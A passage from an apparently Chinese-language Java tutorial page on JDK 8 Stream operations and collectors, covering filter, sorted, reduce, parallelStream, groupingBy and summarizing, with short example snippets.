</p><p>需求：过滤出字符串⻓度⼤于5的字符串</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">List&lt;String&gt; list = Arrays.asList(<span class="string">"springboot"</span>, <span class="string">"springcloud"</span>, <span class="string">"redis"</span>, <span class="string">"git"</span>, <span class="string">"netty"</span>, <span class="string">"java"</span>, <span class="string">"html"</span>, <span class="string">"docker"</span>);</span><br><span class="line">List&lt;String&gt; resultList = list.stream().filter(obj -&gt; obj.length() &gt; <span class="number">5</span>).collect(Collectors.toList());</span><br><span class="line">System.out.println(resultList);</span><br></pre></td></tr></table></figure><p>场景：主要⽤于筛选过滤出符合条件的元素</p><h2 id="JDK8之流操作limit和sorted函数"><a href="#JDK8之流操作limit和sorted函数" class="headerlink" title="JDK8之流操作limit和sorted函数"></a>JDK8之流操作limit和sorted函数</h2><p><strong>sorted函数：sorted() 对流进⾏⾃然排序, 其中的元素必须实现Comparable 接⼝</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">List&lt;String&gt; list = Arrays.asList(<span class="string">"springboot"</span>, <span class="string">"springcloud"</span>, <span class="string">"redis"</span>, <span class="string">"git"</span>, <span class="string">"netty"</span>, <span class="string">"java"</span>, <span class="string">"html"</span>, <span class="string">"docker"</span>);</span><br><span class="line">List&lt;String&gt; resultList = list.stream().sorted().collect(Collectors.toList());</span><br></pre></td></tr></table></figure><p><strong>sorted(Comparator comparator) ⽤来⾃定义升降序</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">List&lt;String&gt; list = Arrays.asList(<span class="string">"springboot"</span>, <span class="string">"springcloud"</span>,</span><br><span class="line"><span class="string">"redis"</span>, <span class="string">"git"</span>, <span class="string">"netty"</span>, <span class="string">"java"</span>, <span class="string">"html"</span>, <span class="string">"docker"</span>);</span><br><span class="line"><span class="comment">//根据⻓度进⾏排序</span></span><br><span class="line"><span class="comment">//List&lt;String&gt; resultList = list.stream().sorted(Comparator.comparing(obj -&gt; obj.length())).collect(Collectors.toList());</span></span><br><span class="line"><span class="comment">//List&lt;String&gt; resultList = list.stream().sorted(Comparator.comparing(obj -&gt; obj.length(),Comparator.reverseOrder())).</span></span><br><span class="line"><span class="comment">//    collect(Collectors.toList());</span></span><br><span class="line"><span class="comment">//List&lt;String&gt; resultList = list.stream().sorted(Comparator.comparing(String::length).reversed()).collect(Collectors.toList());</span></span><br><span class="line">System.out.println(resultList);</span><br></pre></td></tr></table></figure><p><strong>limit函数：截断流使其最多只包含指定数量的元素</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">List&lt;String&gt; list = Arrays.asList(<span class="string">"springboot"</span>, <span class="string">"springcloud"</span>, <span class="string">"redis"</span>, <span class="string">"git"</span>, <span class="string">"netty"</span>, <span class="string">"java"</span>, <span class="string">"html"</span>, <span class="string">"docker"</span>);</span><br><span class="line"><span class="comment">//limit截取</span></span><br><span class="line">List&lt;String&gt; resultList = list.stream().sorted(Comparator.comparing(String::length).reversed()).limit(<span class="number">3</span>).collect(Collectors.toList());</span><br><span class="line">System.out.println(resultList);</span><br></pre></td></tr></table></figure><h2 id="JDK8之流操作allMatch和anyMatch函数"><a href="#JDK8之流操作allMatch和anyMatch函数" class="headerlink" title="JDK8之流操作allMatch和anyMatch函数"></a>JDK8之流操作allMatch和anyMatch函数</h2><p><strong>allMatch函数：检查是否匹配所有元素，只有全部符合才返回true</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">List&lt;String&gt; list = Arrays.asList(<span class="string">"springboot"</span>, <span class="string">"springcloud"</span>, <span class="string">"redis"</span>,</span><br><span class="line"><span class="string">"git"</span>, <span class="string">"netty"</span>, <span class="string">"java"</span>, <span class="string">"html"</span>, <span class="string">"docker"</span>);</span><br><span class="line"><span class="keyword">boolean</span> flag = list.stream().allMatch(obj-&gt;obj.length()&gt;<span class="number">1</span>);</span><br><span class="line">System.out.println(flag);</span><br></pre></td></tr></table></figure><p><strong>anyMatch函数：检查是否⾄少匹配⼀个元素</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">List&lt;String&gt; list = Arrays.asList(<span class="string">"springboot"</span>, <span class="string">"springcloud"</span>, <span class="string">"redis"</span>,</span><br><span class="line"><span class="string">"git"</span>, <span class="string">"netty"</span>, <span class="string">"java"</span>, <span class="string">"html"</span>, <span class="string">"docker"</span>);</span><br><span class="line"><span class="keyword">boolean</span> flag = list.stream().anyMatch(obj-&gt;obj.length()&gt;<span class="number">18</span>);</span><br><span class="line">System.out.println(flag);</span><br></pre></td></tr></table></figure><p>先看⽅法⼊参，返回值，再看⽅法描述</p><h2 id="JDK8之流操作max和min函数"><a href="#JDK8之流操作max和min函数" class="headerlink" title="JDK8之流操作max和min函数"></a>JDK8之流操作max和min函数</h2><p>max和min函数 最⼤值和最⼩值</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">List&lt;Student&gt; list = Arrays.asList(<span class="keyword">new</span> Student(<span class="number">32</span>),<span class="keyword">new</span> Student(<span class="number">33</span>),<span class="keyword">new</span> Student(<span class="number">21</span>),<span class="keyword">new</span> Student(<span class="number">29</span>),<span class="keyword">new</span> Student(<span class="number">18</span>));</span><br><span class="line"><span class="comment">//list.stream().max(Comparator.comparingInt(Student::getAge));</span></span><br><span class="line"><span class="comment">//最⼤</span></span><br><span class="line">Optional&lt;Student&gt; optional = list.stream().max((s1, s2)-&gt;Integer.compare(s1.getAge(),s2.getAge()));</span><br><span class="line"><span class="comment">//最⼩</span></span><br><span class="line">Optional&lt;Student&gt; optional = list.stream().min((s1, s2)-&gt;Integer.compare(s1.getAge(),s2.getAge()));</span><br><span class="line">System.out.println(optional.get().getAge());</span><br></pre></td></tr></table></figure><h1 id="JDK8-集合框架进阶"><a href="#JDK8-集合框架进阶" class="headerlink" title="JDK8 集合框架进阶"></a>JDK8 集合框架进阶</h1><h2 id="JDK8之并⾏流parallelStream"><a href="#JDK8之并⾏流parallelStream" class="headerlink" title="JDK8之并⾏流parallelStream"></a>JDK8之并⾏流parallelStream</h2><p><strong>为什么会有这个并⾏流</strong> </p><p>集合做重复的操作，如果使⽤串⾏执⾏会相当耗时，因此⼀般会采⽤多线程来加快，Java8的 paralleStream⽤fork/join框架提供了并发执⾏能⼒ </p><p>底层原理：线程池(ForkJoinPool)维护⼀个线程队列 可以分割任务，将⽗任务拆分成⼦任务，完全贴合分治思想 </p><p><strong>两个区别</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//顺序输出</span></span><br><span class="line">List&lt;Integer&gt; numbers = Arrays.asList(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>);</span><br><span class="line">numbers.stream().forEach(System.out::println);</span><br><span class="line"><span class="comment">//并⾏乱序输出</span></span><br><span class="line">List&lt;Integer&gt; numbers = Arrays.asList(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>);</span><br><span class="line">numbers.parallelStream().forEach(System.out::println);</span><br></pre></td></tr></table></figure><p><strong>paralleStream并⾏是否⼀定⽐Stream串⾏快？</strong> </p><p>错误，数据量少的情况，可能串⾏更快，ForkJoin会耗性能，多数情况下并⾏⽐串⾏快，是否可以都⽤并⾏？不⾏，部分情况会有线程安全问题，parallelStream⾥⾯使⽤的外部变量，⽐如集合⼀定要使⽤线程安全集合，不然就会引发多线程安全问题。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++) &#123;</span><br><span class="line">    List list = <span class="keyword">new</span> ArrayList();</span><br><span class="line">    <span class="comment">//List list = new CopyOnWriteArrayList();</span></span><br><span class="line">    IntStream.range(<span class="number">0</span>, <span class="number">100</span>).parallel().forEach(list::add);</span><br><span class="line">    System.out.println(list.size());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20210701122255.png" alt="image-20210701122253062"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20210701122331.png" alt="image-20210701122328687"></p><h2 id="JDK8之reduce操作"><a href="#JDK8之reduce操作" class="headerlink" title="JDK8之reduce操作"></a>JDK8之reduce操作</h2><p>什么是reduce操作？</p><ol><li><p>聚合操作，中⽂意思是 “减少” </p></li><li><p>根据⼀定的规则将Stream中的元素进⾏计算后返回⼀个唯⼀的值 </p></li><li><p>常⽤⽅法⼀</p><p>accumulator：计算的累加器</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Optional&lt;T&gt; <span class="title">reduce</span><span class="params">(BinaryOperator&lt;T&gt; accumulator)</span></span>;</span><br></pre></td></tr></table></figure><p>例⼦: 第⼀个元素相加和第⼆个元素相加，结果再和第三个元素相加，直到全部相加完成</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> value = Stream.of(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>).reduce((item1, item2) -&gt; item1 + item2).get();</span><br></pre></td></tr></table></figure><p>不⽤lambda的写法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> result = Stream.of(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>).reduce(<span class="keyword">new</span> BinaryOperator&lt;Integer&gt;() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Integer <span class="title">apply</span><span class="params">(Integer item1, Integer item2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> item1 + item2;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;).get();</span><br></pre></td></tr></table></figure></li><li><p>常⽤⽅法⼆</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">T <span class="title">reduce</span><span class="params">(T identity, BinaryOperator&lt;T&gt; accumulator)</span></span>;</span><br></pre></td></tr></table></figure><p>identity ⽤户提供⼀个循环计算的初始值 </p><p>accumulator 计算的累加器 </p><p>例⼦： 100作为初始值，然后和第⼀个元素相加，结果在和第⼆个元素相加，直到全部 相加完成</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> value = Stream.of(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>,<span class="number">5</span>).reduce(<span class="number">100</span>, (sum, item) -&gt; sum + item);</span><br></pre></td></tr></table></figure></li><li><p>练习 ： 求最⼤值</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> value = Stream.of(<span class="number">1645</span>, <span class="number">234345</span>, <span class="number">32</span>, <span class="number">44434</span>,<span class="number">564534</span>,<span class="number">435</span>,<span class="number">34343542</span>,<span class="number">212</span>).reduce( (item1, item2) -&gt; item1 &gt; item2 ? item1 : item2 ).get();</span><br><span class="line">System.out.println(value);</span><br></pre></td></tr></table></figure></li></ol><h2 id="JDK8之集合的foreach"><a href="#JDK8之集合的foreach" class="headerlink" title="JDK8之集合的foreach"></a>JDK8之集合的foreach</h2><p>集合遍历的⽅式 </p><ol><li>for循环 </li><li>迭代器 Iterator</li></ol><p><strong>Jdk8⾥⾯的新增接⼝</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">default</span> <span class="keyword">void</span> <span class="title">forEach</span><span class="params">(Consumer&lt;? <span class="keyword">super</span> T&gt; action)</span> </span>&#123;</span><br><span class="line">    Objects.requireNonNull(action);</span><br><span class="line">    <span class="keyword">for</span> (T t : <span class="keyword">this</span>) &#123;</span><br><span class="line">        action.accept(t);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>例子</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">List&lt;Student&gt; results = Arrays.asList(<span class="keyword">new</span> Student(<span class="number">32</span>),<span class="keyword">new</span> Student(<span class="number">33</span>),<span class="keyword">new</span> Student(<span class="number">21</span>),<span class="keyword">new</span> Student(<span class="number">29</span>),<span class="keyword">new</span> Student(<span class="number">18</span>));</span><br><span class="line">results.forEach(obj-&gt;&#123;</span><br><span class="line">    System.out.println(obj.toString());</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>注意：</p><ol><li>不能修改包含外部的变量的值 </li><li>不能⽤break或者return或者continue等关键词结束或者跳过循环</li></ol><h1 id="JDK8-收集器和集合统计"><a href="#JDK8-收集器和集合统计" class="headerlink" title="JDK8 收集器和集合统计"></a>JDK8 收集器和集合统计</h1><h2 id="JDK8之collector收集器"><a href="#JDK8之collector收集器" class="headerlink" title="JDK8之collector收集器"></a>JDK8之collector收集器</h2><p>collect()⽅法的作⽤ </p><ol><li><p>⼀个终端操作, ⽤于对流中的数据进⾏归集操作，collect⽅法接受的参数是⼀个Collector </p></li><li><p>有两个重载⽅法，在Stream接⼝⾥⾯</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//重载⽅法⼀</span></span><br><span class="line">&lt;R&gt; <span class="function">R <span class="title">collect</span><span class="params">(Supplier&lt;R&gt; supplier, BiConsumer&lt;R, ? <span class="keyword">super</span> T&gt; accumulator, BiConsumer&lt;R, R&gt;combiner)</span></span>;</span><br><span class="line"><span class="comment">//重载⽅法⼆</span></span><br><span class="line">&lt;R, A&gt; <span class="function">R <span class="title">collect</span><span class="params">(Collector&lt;? <span class="keyword">super</span> T, A, R&gt; collector)</span></span>;</span><br></pre></td></tr></table></figure></li><li><p>Collector的作⽤：就是收集器，也是⼀个接⼝, 它的⼯具类Collectors提供了很多⼯⼚⽅法</p></li><li><p>Collectors的作⽤：⼯具类，提供了很多常⻅的收集器实现</p><p>Collectors.toList()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; Collector&lt;T, ?, List&lt;T&gt;&gt; toList() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> CollectorImpl&lt;&gt;((Supplier&lt;List&lt;T&gt;&gt;) ArrayList::<span class="keyword">new</span>, List::add,(left, right) -&gt; &#123;</span><br><span class="line">        left.addAll(right); </span><br><span class="line">        <span class="keyword">return</span> left; </span><br><span class="line">    &#125;, CH_ID);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ArrayList::new，创建⼀个ArrayList作为累加器 </p><p>List::add，对流中元素的操作就是直接添加到累加器中 r</p><p>reduce操作, 对⼦任务归集结果addAll，后⼀个⼦任务的结果直接全部添加到前⼀个⼦任务结果中 </p><p>CH_ID 是⼀个unmodifiableSet集合</p></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Collectors.toMap() </span><br><span class="line">Collectors.toSet() </span><br><span class="line">Collectors.toCollection() ：⽤⾃定义的实现Collection的数据结构收集 </span><br><span class="line"></span><br><span class="line">Collectors.toCollection(LinkedList::new) </span><br><span class="line">Collectors.toCollection(CopyOnWriteArrayList::new) </span><br><span class="line">Collectors.toCollection(TreeSet::new)</span><br></pre></td></tr></table></figure><h2 id="JDK8之joining函数"><a href="#JDK8之joining函数" class="headerlink" title="JDK8之joining函数"></a>JDK8之joining函数</h2><p>拼接函数 Collectors.joining</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//3种重载⽅法</span></span><br><span class="line">Collectors.joining()</span><br><span class="line">Collectors.joining(<span class="string">"param"</span>)</span><br><span class="line">Collectors.joining(<span class="string">"param1"</span>, <span class="string">"param2"</span>, <span class="string">"param3"</span>)</span><br></pre></td></tr></table></figure><p>其中⼀个的实现</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Collector&lt;CharSequence, ?, String&gt; joining() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> CollectorImpl&lt;CharSequence, StringBuilder, String&gt;(</span><br><span class="line">        StringBuilder::<span class="keyword">new</span>, </span><br><span class="line">        StringBuilder::append,</span><br><span class="line">        (r1, r2) -&gt; &#123; r1.append(r2); <span class="keyword">return</span> r1; &#125;,</span><br><span class="line">        StringBuilder::toString, CH_NOID);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>说明： 该⽅法可以将Stream得到⼀个字符串， joining函数接受三个参数时，分别表示元素之间的连接符、前缀和后缀。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String result = Stream.of(<span class="string">"springboot"</span>, <span class="string">"mysql"</span>, <span class="string">"html5"</span>, <span class="string">"css3"</span>).collect(Collectors.joining(<span class="string">","</span>, <span class="string">"["</span>, <span class="string">"]"</span>));</span><br></pre></td></tr></table></figure><h2 id="JDK8之收集器-partitioningBy分组"><a href="#JDK8之收集器-partitioningBy分组" class="headerlink" title="JDK8之收集器 partitioningBy分组"></a>JDK8之收集器 partitioningBy分组</h2><p>Collectors.partitioningBy 分组，key是boolean类型</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt;</span><br><span class="line">    Collector&lt;T, ?, Map&lt;Boolean, List&lt;T&gt;&gt;&gt; partitioningBy(Predicate&lt;? <span class="keyword">super</span> T&gt; predicate) &#123;</span><br><span class="line">    <span class="keyword">return</span> partitioningBy(predicate, toList());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>练习： 根据list⾥⾯进⾏分组，字符串⻓度⼤于4的为⼀组，其他为另外⼀组</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">List&lt;String&gt; list = Arrays.asList(<span class="string">"java"</span>, <span class="string">"springboot"</span>,<span class="string">"HTML5"</span>,<span class="string">"nodejs"</span>,<span class="string">"CSS3"</span>);</span><br><span class="line">Map&lt;Boolean, List&lt;String&gt;&gt; result = list.stream().collect(partitioningBy(obj -&gt; obj.length() &gt; <span class="number">4</span>));</span><br></pre></td></tr></table></figure><h2 id="JDK8之收集器-group-by分组"><a href="#JDK8之收集器-group-by分组" class="headerlink" title="JDK8之收集器 group by分组"></a>JDK8之收集器 group by分组</h2><p>分组 Collectors.groupingBy()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;T, K&gt; Collector&lt;T, ?, Map&lt;K, List&lt;T&gt;&gt;&gt; groupingBy(Function&lt;? <span class="keyword">super</span> T, ? extends K&gt; classifier) &#123; </span><br><span class="line">    <span class="keyword">return</span> groupingBy(classifier, toList());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>练习：根据学⽣所在的省份，进⾏分组</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">List&lt;Student&gt; students = Arrays.asList(<span class="keyword">new</span> Student(<span class="string">"⼴东"</span>, <span class="number">23</span>), <span class="keyword">new</span> Student(<span class="string">"⼴东"</span>, <span class="number">24</span>), <span class="keyword">new</span> Student(<span class="string">"⼴东"</span>, <span class="number">23</span>),<span class="keyword">new</span> Student(<span class="string">"北京"</span>, <span class="number">22</span>), <span class="keyword">new</span> Student(<span class="string">"北京"</span>, <span class="number">20</span>), <span class="keyword">new</span> Student(<span class="string">"北京"</span>, <span class="number">20</span>),<span class="keyword">new</span> Student(<span class="string">"海南"</span>, <span class="number">25</span>));</span><br><span class="line">Map&lt;String, List&lt;Student&gt;&gt; listMap = students.stream().collect(Collectors.groupingBy(obj -&gt; obj.getProvince()));</span><br><span class="line">listMap.forEach((key, value) -&gt; &#123;</span><br><span class="line">    System.out.println(<span class="string">"========"</span>);</span><br><span class="line">    System.out.println(key);</span><br><span class="line">    value.forEach(obj -&gt; &#123;</span><br><span class="line">        System.out.println(obj.getAge());</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String province;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getProvince</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> province;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setProvince</span><span class="params">(String province)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.province = province;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Student</span><span class="params">(String province, <span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">        <span class="keyword">this</span>.province = province;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="JDK8之收集器-group-by进阶"><a href="#JDK8之收集器-group-by进阶" class="headerlink" title="JDK8之收集器 group by进阶"></a>JDK8之收集器 group by进阶</h2><p>分组统计</p><ol><li>聚合函数进⾏统计查询，分组后统计个数 </li><li>Collectors.counting() 统计元素个数</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;T, K, A, D&gt; Collector&lt;T, ?, Map&lt;K, D&gt;&gt; groupingBy(Function&lt;? <span class="keyword">super</span> T, ? extends K&gt; classifier,Collector&lt;? <span class="keyword">super</span> T, A, D&gt; downstream) &#123;</span><br><span class="line"> <span class="keyword">return</span> groupingBy(classifier, HashMap::<span class="keyword">new</span>, downstream);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需求：统计各个省份的⼈数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">List&lt;Student&gt; students = Arrays.asList(<span class="keyword">new</span> Student(<span class="string">"⼴东"</span>, <span class="number">23</span>), <span class="keyword">new</span> Student(<span class="string">"⼴东"</span>, <span class="number">24</span>), <span class="keyword">new</span> Student(<span class="string">"⼴东"</span>, <span class="number">23</span>),<span class="keyword">new</span> Student(<span class="string">"北京"</span>, <span class="number">22</span>), <span class="keyword">new</span> Student(<span class="string">"北京"</span>, <span class="number">20</span>), <span class="keyword">new</span> Student(<span class="string">"北京"</span>, <span class="number">20</span>),<span class="keyword">new</span> Student(<span class="string">"海南"</span>, <span class="number">25</span>));</span><br><span class="line">Map&lt;String, Long&gt; listMap = students.stream().collect(Collectors.groupingBy(Student::getProvince,</span><br><span class="line">                                                    Collectors.counting()));</span><br><span class="line">listMap.forEach((key, value) -&gt; &#123;System.out.println(key+<span class="string">"省⼈数有"</span>+value);&#125;);</span><br></pre></td></tr></table></figure><h2 id="JDK8之summarizing集合统计"><a href="#JDK8之summarizing集合统计" class="headerlink" title="JDK8之summarizing集合统计"></a>JDK8之summarizing集合统计</h2><p>summarizing 统计相关, 下⾯是summarizingInt的源码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; Collector&lt;T, ?, IntSummaryStatistics&gt; summarizingInt(ToIntFunction&lt;? <span class="keyword">super</span> T&gt; mapper) &#123; </span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> CollectorImpl&lt;T, IntSummaryStatistics, IntSummaryStatistics&gt;(</span><br><span class="line">    IntSummaryStatistics::<span class="keyword">new</span>,</span><br><span class="line">    (r, t) -&gt; r.accept(mapper.applyAsInt(t)),</span><br><span class="line">    (l, r) -&gt; &#123; l.combine(r); <span class="keyword">return</span> l; &#125;, CH_ID);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>作⽤：可以⼀个⽅法把统计相关的基本上都完成</p><p>分类 </p><ol><li>summarizingInt </li><li>summarizingLong </li><li>summarizingDouble</li></ol><p>需求：统计学⽣的各个年龄信息</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">List&lt;Student&gt; students = Arrays.asList(<span class="keyword">new</span> Student(<span class="string">"⼴东"</span>, <span class="number">23</span>), <span class="keyword">new</span> Student(<span class="string">"⼴东"</span>, <span class="number">24</span>), <span class="keyword">new</span> Student(<span class="string">"⼴东"</span>, <span class="number">23</span>),<span class="keyword">new</span> Student(<span class="string">"北京"</span>, <span class="number">22</span>), <span class="keyword">new</span> Student(<span class="string">"北京"</span>, <span class="number">20</span>), <span class="keyword">new</span> Student(<span 